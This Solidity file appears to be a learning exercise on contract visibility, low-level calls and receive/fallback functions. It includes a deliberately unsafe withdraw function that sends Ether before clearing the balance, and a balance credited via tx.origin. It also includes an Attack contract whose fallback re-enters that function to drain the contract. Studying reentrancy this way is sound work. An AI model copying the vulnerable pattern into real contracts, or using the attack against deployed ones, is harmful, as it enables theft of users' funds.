// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IFirst {
    function setPublic(uint256 num) external;
    function setPrivate(uint256 num) external;
    function setInternal(uint256 num) external;
    function sum() external view returns (uint256);
    function sumFromSecond(address contractAddress) external returns (uint256);
    function callExternalReceive(address payable contractAddress) external payable;
    function callExternalFallback(address payable contractAddress) external payable;
    function getSelector() external pure returns (bytes memory);
}

interface ISecond {
    function withdrawSafe(address payable holder) external;
    function withdrawUnsafe(address payable holder) external;
}

interface IAttacker {
    function increaseBalance() external payable;
    function attack() external;
}

contract First is Ownable {
    uint256 public ePublic;
    uint256 private ePrivate;
    uint256 internal eInternal;

    function setPublic(uint256 num) external onlyOwner {
        ePublic = num;
    }

    function setPrivate(uint256 num) external onlyOwner {
        ePrivate = num;
    }

    function setInternal(uint256 num) external onlyOwner {
        eInternal = num;
    }

    function sum() external view virtual returns (uint256) {
        return ePublic + ePrivate + eInternal;
    }

    // I just do not know how to correctly do it...
    function sumFromSecond(address contractAddress) external returns (uint256) {
        (bool success, bytes memory _data) = contractAddress.call(abi.encodeWithSignature("sum()"));
        require(success, "sum wasn't called");
        return abi.decode(_data, (uint256));
    }

    function callExternalReceive(address payable contractAddress) external payable {
        require(msg.value == 0.0001 ether);
        (bool sent, ) = contractAddress.call{value: 0.0001 ether}("");
        require(sent, "failed to sent Ether");
    }

    function callExternalFallback(address payable contractAddress) external payable {
        require(msg.value == 0.0002 ether);
        (bool sent, ) = contractAddress.call{value: 0.0002 ether}("data");
        require(sent, "failed to sent Ether");
    }

    function getSelector() external pure returns (bytes memory) {
        string memory str = string(abi.encodeWithSignature("ePublic()"));
        str = string.concat(str, string(abi.encodeWithSignature("setPublic(uint256)")));
        str = string.concat(str, string(abi.encodeWithSignature("setPrivate(uint256)")));
        str = string.concat(str, string(abi.encodeWithSignature("setInternal(uint256)")));
        str = string.concat(str, string(abi.encodeWithSignature("sumFromSecond(address)")));
        str = string.concat(str, string(abi.encodeWithSignature("callExternalReceive(address)")));
        str = string.concat(str, string(abi.encodeWithSignature("callExternalFallback(address)")));
        str = string.concat(str, string(abi.encodeWithSignature("getSelector()")));
        str = string.concat(str, string(abi.encodeWithSignature("sum()")));
        return bytes(str);
    }

    function getAddress() external view virtual returns (address) {
        return address(this);
    }
}

contract Second is First, ISecond {
    mapping(address => uint256) public balance;

    function sendEth() external payable {
        address(this).call{value: msg.value}("");
    }

    function sum() external view override returns (uint256) {
        return ePublic + eInternal;
    }

    receive() external payable {
        balance[tx.origin] += msg.value;
    }

    fallback() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdrawSafe(address payable holder) external {
        uint amount_ = balance[holder];
        balance[holder] = 0;
        holder.transfer(amount_);
    }

    function withdrawUnsafe(address payable holder) external {
        uint amount_ = balance[holder];
        require(amount_ > 0);

        holder.call{value: amount_}("");

        balance[holder] = 0;
    }

    function getAddress() external view override returns (address) {
        return address(this);
    }
}

contract Attack is IAttacker {
    Second private second_;

    constructor(address payable _secondAddress) {
        second_ = Second(_secondAddress);
    }

    function increaseBalance() external payable {
        (bool sent, ) = payable(address(second_)).call{value: msg.value}("d");
        require(sent, "failed to sent Ether");
    }

    fallback() external payable {
        second_.withdrawUnsafe(payable(address(this)));
    }

    function attack() external {
        second_.withdrawUnsafe(payable(address(this)));
    }

    function getAddress() external view returns (address) {
        return address(this);
    }
}
